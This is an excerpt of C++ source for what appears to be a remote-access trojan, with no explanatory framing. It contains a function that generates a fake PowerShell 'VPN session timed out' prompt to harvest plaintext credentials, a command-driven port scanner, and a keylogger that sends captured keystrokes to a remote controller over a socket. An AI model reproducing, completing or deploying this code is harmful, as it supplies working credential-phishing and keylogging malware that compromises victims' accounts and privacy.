...
string utilShowCredentialsPrompt()
{
    ...
    out << "$creds = Get-Credential -Message 'Out VPN connection timed out. Please renew your session:';" << endl;
    out << "$creds2 = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($creds.Password);" << endl;
    out << "$name = $creds.UserName;" << endl;
    out << "$pass = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($creds2);" << endl;
    out << "echo $name/$pass" << endl;
    out.close();
...
string utilScan(string command)
{
    ...
    if (words.size() == 3)
    {
        ...
        string addr = words[1];
        // reading port
        string ports = words[2];
           
        vector<string> portsArr = splitStr(ports, ',');
        
        for (int i = 0; i < portsArr.size(); i++) 
        {
            // try to connect
            ConnectSocket = initSocket(addr, portsArr[i]);

            // ConnectSocket == 1 if unable to connect
            if (ConnectSocket == 1)
            {
                output = output + addr + ":" + portsArr[i] + " is closed\n";
            }
            else
            {
                output = output + addr + ":" + portsArr[i] + " is open\n";
            }
        }
...
void utilKeyloggerInit(SOCKET ConnectSocket, string cmd)
{
    ...
    // check syntax "!keylog TIME"
    if (words.size() == 2)
    {
        int maxTime = stoi(words[1]);
        sendMsg(ConnectSocket, "KEYLOGGER MESSAGES:");

        while (difftime(now, start) < maxTime) {
            Sleep(0.1);
    ...
    {
        // syntax check failed
        sendMsg(ConnectSocket, "ERR, syntax: !keylog TIME" + prompt);
    }
}
